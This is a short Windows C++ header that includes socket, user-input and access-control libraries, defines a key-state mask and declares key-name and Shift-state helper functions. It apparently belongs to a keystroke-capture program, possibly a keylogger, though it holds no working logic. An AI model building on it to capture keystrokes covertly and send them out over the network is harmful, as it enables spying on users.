#ifndef COMMON_H
#define COMMON_H
#include <winsock2.h>
#include <vector>
#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <Winuser.h>
#include <string>
#include <fstream>
#include <aclapi.h>
#pragma comment(lib,"advapi32.lib")  
#pragma comment(lib, "ws2_32.lib")
using namespace std;
const int KeyBoardValue = 0x80000000;
string GetKeyName(int);
bool JudgeShift();
#endif
